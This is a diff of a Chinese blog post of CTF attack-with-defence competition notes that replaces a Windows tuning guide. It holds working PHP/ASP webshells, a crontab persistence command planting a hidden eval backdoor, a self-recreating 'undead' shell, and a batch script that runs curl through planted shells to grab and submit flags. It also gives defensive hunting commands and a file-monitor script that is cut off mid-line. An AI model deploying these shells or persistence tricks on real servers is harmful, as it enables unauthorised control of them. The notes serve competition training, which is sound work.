+    <content><![CDATA[<h1 id="比赛攻击思路"><a href="#比赛攻击思路" class="headerlink" title="比赛攻击思路"></a>比赛攻击思路</h1><h2 id="搜索存活主机"><a href="#搜索存活主机" class="headerlink" title="搜索存活主机"></a>搜索存活主机</h2><p>信息收集</p>
+<ul>
+<li>nmap、Routescan</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">namp -sn 192.168.0.0/24          <span class="comment">#扫描C段主机存活</span></span><br></pre></td></tr></table></figure>
 
-<p><strong>关闭计划任务</strong></p>
-<p>在桌面找到<strong>我的电脑</strong>，右键<strong>管理，</strong>然后依次点击<strong>系统工具，任务计划程序，任务计划程序库，microsoft，windows，windows update，将里面的选项都右键</strong>禁用。</p>
-<h1 id="关闭最近使用文件"><a href="#关闭最近使用文件" class="headerlink" title="关闭最近使用文件"></a>关闭最近使用文件</h1><p>步骤如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打开此电脑</span><br><span class="line">切换到选项卡，点击进入</span><br><span class="line">在常规下，隐私内关闭即可</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Python 脚本</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">for x in range(2,255): </span><br><span class="line">    url = &quot;http://192.168.1.&#123;&#125;&quot;.format(x) </span><br><span class="line">    try: </span><br><span class="line">        r = requests.post(url) </span><br><span class="line">        print(url) </span><br><span class="line">        except: </span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
 
-<h1 id="关闭win10一些服务"><a href="#关闭win10一些服务" class="headerlink" title="关闭win10一些服务"></a>关闭win10一些服务</h1><p>在桌面上找到 此电脑 右键—-管理 点击。</p>
-<p>然后如图所示，点开服务。</p>
-<p><strong>关闭并禁用这些服务</strong></p>
-<p><strong>Connected User Experiences and Telemetry</strong></p>
-<p>一个微软操作系统外围辅助服务。这项服务除了收集数据之外，还兼有收集错误和崩溃信息的职责，因此对于微软改进系统也有重要的意义。如果你不介意微软收集这些信息，可以保持服务的开启状态。</p>
-<p><strong>Diagnostic Execution Service</strong></p>
-<p>系统诊断执行服务 没什么卵用</p>
-<p><strong>HomeGroup Listener和HomeGroupProvider</strong></p>
-<p>家庭组服务，没什么卵用.</p>
-<p><strong>windows server</strong></p>
-<p>如果不经常使用系统搜索就关闭它</p>
-<p><strong>Program CompatibilityAssistant Service</strong></p>
-<p>兼容助手服务，</p>
-<p><strong>SecurityCenter</strong></p>
-<p>安全中心服务，直接禁用</p>
-<p><strong>SysMain</strong></p>
-<p>这个服务如果电脑上全部都是固态，可以关闭，要是有机械的话，有一定的作用。</p>
-<p>以上服务全部禁用。</p>
-<h1 id="关闭系统界面特效，优化系统性能"><a href="#关闭系统界面特效，优化系统性能" class="headerlink" title="关闭系统界面特效，优化系统性能"></a><strong>关闭系统界面特效，优化系统性能</strong></h1><p>如果选择 最佳性能的话，字体比较难看，看的不习惯，勾选 平滑字体边缘。其他的根据自己需要勾选，不在乎字体的话，直接 最佳性能</p>
-<p>只勾选：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">平滑滚动列表框</span><br><span class="line">平滑屏幕字体边缘</span><br><span class="line">启用速览</span><br></pre></td></tr></table></figure>
+<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>预留到后面会被防守人删除，所以为了稳定得分，我们得进行权限维持。</p>
+<p><strong>隐藏文件读取</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(php<span class="string">&#x27;flag:&#x27;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/flag&#x27;</span>));</span><br></pre></td></tr></table></figure>
 
-<p>顺便设置下 系统启动设置</p>
+<p><strong>crontab定时任务</strong><br>使用定时任务写马</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">system(<span class="string">&#x27;echo &quot;* * * * * echo \&quot;&lt;?php  if(md5(\\\\\\\\\$_POST[pass])==\&#x27;</span>462d4a0e7cedd6b024a4d99f10c614d1\<span class="string">&#x27;)&#123;@eval(\\\\\\\\\$_POST[1]);&#125;  \&quot; &gt; /var/www/html/.index.php\n* * * * * chmod 777 /var/www/html/.index.php&quot; | crontab;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>密码：atkx<br>来指定用户运行指定的定时任务</p>
+<h2 id="预留后门利用"><a href="#预留后门利用" class="headerlink" title="预留后门利用"></a>预留后门利用</h2><p>记录一下蚁剑连接，get型木马</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">/shell.php?pass=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line">连接密码：<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>常用一句话木马：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php： </span><br><span class="line">	<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span>      </span><br><span class="line">	<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">asp：   </span><br><span class="line">	&lt;%<span class="keyword">eval</span> <span class="title function_ invoke__">request</span> (<span class="string">&quot;pass&quot;</span>)%&gt;</span><br><span class="line">aspx：</span><br><span class="line">	&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;</span><br><span class="line">	&lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">&quot;pass&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>批量脚本</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> http <span class="keyword">import</span> cookies</span><br><span class="line"><span class="keyword">import</span> sys,requests,base64,time</span><br><span class="line"><span class="keyword">from</span> matplotlib.pyplot <span class="keyword">import</span> flag</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) <span class="comment">#禁用安全请求警告</span></span><br><span class="line"><span class="comment">#利用一句话木马得到flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#加载一句话地址的文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell_list</span>(<span class="params">filepath</span>):</span><br><span class="line">    <span class="comment">#格式 http://192.168.174.128/shell.php</span></span><br><span class="line">    <span class="comment">#返回列表</span></span><br><span class="line">    <span class="keyword">try</span> : </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filepath,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.readlines()</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> : </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;File&quot;</span>+filepath+<span class="string">&quot; Not Found!&quot;</span>) </span><br><span class="line">        sys.exit()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>(<span class="params">filepath</span>):</span><br><span class="line">    file = <span class="string">&#x27;flag&#x27;</span>+<span class="built_in">str</span>(time.time())[-<span class="number">5</span>:]+<span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">    <span class="comment">#加载shell地址</span></span><br><span class="line">    <span class="built_in">list</span> = shell_list(filepath)</span><br><span class="line">    <span class="comment">#访问 执行查看flag命令  linux就是cat</span></span><br><span class="line">    <span class="comment"># get方式</span></span><br><span class="line">    <span class="comment"># getflag_cmd =&#x27;echo system(&quot;cat /flag&quot;);&#x27;</span></span><br><span class="line">    <span class="comment"># getflag_cmd =&#x27;echo system(&quot;wget -q -O - http://192.168.1.146:9898/flag&quot;);&#x27;                          		# post方式                   </span></span><br><span class="line">    passwd=<span class="string">&quot;dbapp#2020&quot;</span> <span class="comment">#木马密码</span></span><br><span class="line">    payload =  &#123;passwd: <span class="string">&#x27;system(&quot;curl http://10.0.1.2?token=XFMDKLVJ&quot;);&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        <span class="comment">#url  = url.strip(&#x27;\r\n&#x27;) + &quot;?x=&quot; +getflag_cmd            #get方式</span></span><br><span class="line">        url  = url.strip(<span class="string">&#x27;\r\n&#x27;</span>)                                  <span class="comment">#post方式</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#res = requests.get(url=url,timeout=5)                #get方式</span></span><br><span class="line">            res = requests.post(url=url,data=payload,timeout=<span class="number">5</span>)   <span class="comment">#post方式</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(url+<span class="string">&quot;[ - ] request timeout [ - ]&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> res.content:</span><br><span class="line">            content = <span class="built_in">str</span>(res.content,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span> : </span><br><span class="line">            <span class="comment">#把得到的flag存到flag文件再批量提交</span></span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.writelines(content+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> : </span><br><span class="line">                 <span class="built_in">print</span>(<span class="string">&quot;写flag.txt文件失败！！&quot;</span>)</span><br><span class="line">                 sys.exit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] getflag sucessed! flag文件:&quot;</span> +file)</span><br><span class="line">    <span class="keyword">return</span> file</span><br><span class="line"></span><br><span class="line"><span class="comment">#批量提交flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sentflag</span>(<span class="params">filepath,url</span>):</span><br><span class="line">    filename = getflag(filepath)<span class="comment">#返回存放flag的地址</span></span><br><span class="line">    <span class="comment">#读取存放flag文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        flags = f.readlines()</span><br><span class="line">        <span class="keyword">for</span> flag <span class="keyword">in</span> flags:</span><br><span class="line">            flag_p=flag.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;atn&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;token&#x27;</span>:<span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;flag&#x27;</span>:flag_p</span><br><span class="line">            &#125;</span><br><span class="line">            cookie=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;Samesite&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;php-console-server&#x27;</span>:<span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;matchToken_131&#x27;</span>:<span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;adl&#x27;</span>:<span class="string">&#x27;5&#x27;</span>&#125;</span><br><span class="line">            <span class="keyword">try</span> : </span><br><span class="line">                res = requests.post(url, data=data, verify=<span class="literal">False</span>, cookies=cookie)</span><br><span class="line">                <span class="keyword">if</span> res.status_code==<span class="number">200</span> :</span><br><span class="line">                  <span class="built_in">print</span>(<span class="string">&quot;Get flag Success&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> : </span><br><span class="line">                 <span class="built_in">print</span>(<span class="string">&quot;[ ------------&gt; ] Send Flag Failed [ &lt;----------- ]&quot;</span>)</span><br><span class="line">                 sys.exit()</span><br><span class="line">            </span><br><span class="line">           </span><br><span class="line"><span class="comment">#第一个参数需要一个存放shell的地址，格式 http://192.168.174.128/test.php?x=    </span></span><br><span class="line"><span class="comment">#第二个参数需要提交flag的地址 例如http://1.1.1.1/submit.php?token=xxxx&amp;flag=xxxxx</span></span><br><span class="line"></span><br><span class="line">filepath = <span class="string">&#x27;./bsm_shell.txt&#x27;</span> <span class="comment">#自己创建</span></span><br><span class="line">url = <span class="string">&#x27;https://10.0.0.xx/mx/xx/axx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">timer</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sentflag(filepath,url)</span><br><span class="line">        time.sleep(n)</span><br><span class="line"></span><br><span class="line">timer(<span class="number">120</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h1><h2 id="SSH口令更改"><a href="#SSH口令更改" class="headerlink" title="SSH口令更改"></a>SSH口令更改</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd username    <span class="comment">#ssh口令修改</span></span><br><span class="line"><span class="built_in">set</span> password <span class="keyword">for</span> mycms@localhost = password(<span class="string">&#x27;123&#x27;</span>); <span class="comment">#MySQL密码修改</span></span><br><span class="line">find /var/www//html -path <span class="string">&#x27;*config*’  #查找配置文件中的密码凭证</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h2><p>通过xshell或其他管理</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /var/www/html -name *.php -mmin -20 <span class="comment">#查看最近20分钟修改文件</span></span><br><span class="line">find ./ -name <span class="string">&#x27;*.php&#x27;</span> | xargs <span class="built_in">wc</span> -l | <span class="built_in">sort</span> -u <span class="comment">#寻找行数最短文件</span></span><br><span class="line">grep -r --include=*.php  <span class="string">&#x27;[^a-z]eval($_POST&#x27;</span>  /var/www/html    <span class="comment">#查包含关键字的php文件</span></span><br><span class="line">find /var/www/html -<span class="built_in">type</span> f -name <span class="string">&quot;*.php&quot;</span> | xargs grep <span class="string">&quot;eval(&quot;</span> |more</span><br></pre></td></tr></table></figure>
+
+<h2 id="不死马查杀"><a href="#不死马查杀" class="headerlink" title="不死马查杀"></a>不死马查杀</h2><p>进行条件竞争或写个脚本直接杀。</p>
+<p>进程查杀</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux | grep www-data</span><br><span class="line"><span class="comment">##</span></span><br><span class="line">ps aux | grep www-data | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps aux | grep www-data | grep -v grep | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line"><span class="comment">##</span></span><br><span class="line">awk ‘&#123;<span class="built_in">print</span> <span class="variable">$2</span>&#125;’</span><br><span class="line">提取字符串行内容的第2个字段，也就是当前示例的进程号</span><br></pre></td></tr></table></figure>
+
+<p>比如写个马来一直杀死不死马进程：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;kill -9 pid;rm -rf .shell.php&quot;</span>); <span class="comment">#pid和不死马名称根据实际情况定</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;.3.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;hi springbird !&#x27;</span>;</span><br><span class="line">    <span class="comment">//pass=pass</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#x27;</span>);</span><br><span class="line">    <span class="comment">//    usleep(5000);</span></span><br><span class="line">          <span class="title function_ invoke__">usleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>创建一个和马仔一样的文件夹<br>循环创建</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">dire=<span class="string">&quot;/var/www/html/.base.php/&quot;</span></span><br><span class="line">file=<span class="string">&quot;/var/www/html/.base.php&quot;</span></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="variable">$file</span></span><br><span class="line"><span class="built_in">mkdir</span> <span class="variable">$dire</span></span><br><span class="line"></span><br><span class="line">./xx.sh</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h2><p>文件监控可以及时查看木马删除，并删除</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#use: python file_check.py ./</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> ntpath</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">CWD = os.getcwd()</span><br><span class="line">FILE_MD5_DICT = &#123;&#125;      <span class="comment"># 文件MD5字典</span></span><br><span class="line">ORIGIN_FILE_LIST = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 特殊文件路径字符串</span></span><br><span class="line">Special_path_str = <span class="string">&#x27;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#x27;</span></span><br><span class="line">bakstring = <span class="string">&#x27;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#x27;</span></span><br><span class="line">logstring = <span class="string">&#x27;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span></span><br><span class="line">webshellstring = <span class="string">&#x27;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span></span><br><span class="line">difffile = <span class="string">&#x27;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#x27;</span></span><br><span class="line"></span><br><span class="line">Special_string = <span class="string">&#x27;drops_log&#x27;</span>  <span class="comment"># 免死金牌</span></span><br><span class="line">UNICODE_ENCODING = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">INVALID_UNICODE_CHAR_FORMAT = <span class="string">r&quot;\?%02x&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件路径字典</span></span><br><span class="line">spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))</span><br><span class="line">Special_path = &#123;</span><br><span class="line">    <span class="string">&#x27;bak&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, bakstring)),</span><br><span class="line">    <span class="string">&#x27;log&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, logstring)),</span><br><span class="line">    <span class="string">&#x27;webshell&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, webshellstring)),</span><br><span class="line">    <span class="string">&#x27;difffile&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, difffile)),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isListLike</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">isinstance</span>(value, (<span class="built_in">list</span>, <span class="built_in">tuple</span>, <span class="built_in">set</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取Unicode编码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUnicode</span>(<span class="params">value, encoding=<span class="literal">None</span>, noneToNull=<span class="literal">False</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> noneToNull <span class="keyword">and</span> value <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> NULL</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isListLike(value):</span><br><span class="line">        value = <span class="built_in">list</span>(getUnicode(_, encoding, noneToNull) <span class="keyword">for</span> _ <span class="keyword">in</span> value)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, unicode):</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(value, basestring):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> unicode(value, encoding <span class="keyword">or</span> UNICODE_ENCODING)</span><br><span class="line">            <span class="keyword">except</span> UnicodeDecodeError, ex:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">return</span> unicode(value, UNICODE_ENCODING)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    value = value[:ex.start] + <span class="string">&quot;&quot;</span>.join(INVALID_UNICODE_CHAR_FORMAT % <span class="built_in">ord</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> value[ex.start:ex.end]) + value[ex.end:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> unicode(value)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">return</span> unicode(<span class="built_in">str</span>(value), errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目录创建</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mkdir_p</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">import</span> errno</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="keyword">if</span> exc.errno == errno.EEXIST <span class="keyword">and</span> os.path.isdir(path):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前所有文件路径</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getfilelist</span>(<span class="params">cwd</span>):</span><br><span class="line">    filelist = []</span><br><span class="line">    <span class="keyword">for</span> root,subdirs, files <span class="keyword">in</span> os.walk(cwd):</span><br><span class="line">        <span class="keyword">for</span> filepath <span class="keyword">in</span> files:</span><br><span class="line">            originalfile = os.path.join(root, filepath)</span><br><span class="line">            <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> originalfile:</span><br><span class="line">                filelist.append(originalfile)</span><br><span class="line">    <span class="keyword">return</span> filelist</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算机文件MD5值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calcMD5</span>(<span class="params">filepath</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filepath,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            md5obj = hashlib.md5()</span><br><span class="line">            md5obj.update(f.read())</span><br><span class="line">            <span class="built_in">hash</span> = md5obj.hexdigest()</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">hash</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">u&#x27;[!] getmd5_error : &#x27;</span> + getUnicode(filepath)</span><br><span class="line">        <span class="built_in">print</span> getUnicode(e)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ORIGIN_FILE_LIST.remove(filepath)</span><br><span class="line">            FILE_MD5_DICT.pop(filepath, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">except</span> KeyError, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取所有文件MD5</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getfilemd5dict</span>(<span class="params">filelist = []</span>):</span><br><span class="line">    filemd5dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> ori_file <span class="keyword">in</span> filelist:</span><br><span class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> ori_file:</span><br><span class="line">            md5 = calcMD5(os.path.realpath(ori_file))</span><br><span class="line">            <span class="keyword">if</span> md5:</span><br><span class="line">                filemd5dict[ori_file] = md5</span><br><span class="line">    <span class="keyword">return</span> filemd5dict</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份所有文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backup_file</span>(<span class="params">filelist=[]</span>):</span><br><span class="line">    <span class="comment"># if len(os.listdir(Special_path[&#x27;bak&#x27;])) == 0:</span></span><br><span class="line">    <span class="keyword">for</span> filepath <span class="keyword">in</span> filelist:</span><br><span class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> filepath:</span><br><span class="line">            shutil.copy2(filepath, Special_path[<span class="string">&#x27;bak&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">u&#x27;---------start------------&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> Special_path:</span><br><span class="line">        mkdir_p(Special_path[value])</span><br><span class="line">    <span class="comment"># 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span></span><br><span class="line">    ORIGIN_FILE_LIST = getfilelist(CWD)</span><br><span class="line">    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">    backup_file(ORIGIN_FILE_LIST) <span class="comment"># TODO 备份文件可能会产生重名BUG</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">u&#x27;[*] pre work end!&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        file_list = getfilelist(CWD)</span><br><span class="line">        <span class="comment"># 移除新上传文件</span></span><br><span class="line">        diff_file_list = <span class="built_in">list</span>(<span class="built_in">set</span>(file_list) ^ <span class="built_in">set</span>(ORIGIN_FILE_LIST))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(diff_file_list) != <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># import pdb;pdb.set_trace()</span></span><br><span class="line">            <span class="keyword">for</span> filepath <span class="keyword">in</span> diff_file_list:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f = <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">                <span class="keyword">except</span> Exception, e:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[*] webshell find : &#x27;</span> + getUnicode(filepath)</span><br><span class="line">                        shutil.move(filepath, os.path.join(Special_path[<span class="string">&#x27;webshell&#x27;</span>], ntpath.basename(filepath) + <span class="string">&#x27;.txt&#x27;</span>))</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filepath)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        f = <span class="built_in">open</span>(os.path.join(Special_path[<span class="string">&#x27;log&#x27;</span>], <span class="string">&#x27;log.txt&#x27;</span>), <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">                        f.write(<span class="string">&#x27;newfile: &#x27;</span> + getUnicode(filepath) + <span class="string">&#x27; : &#x27;</span> + <span class="built_in">str</span>(time.ctime()) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                        f.close()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span> <span 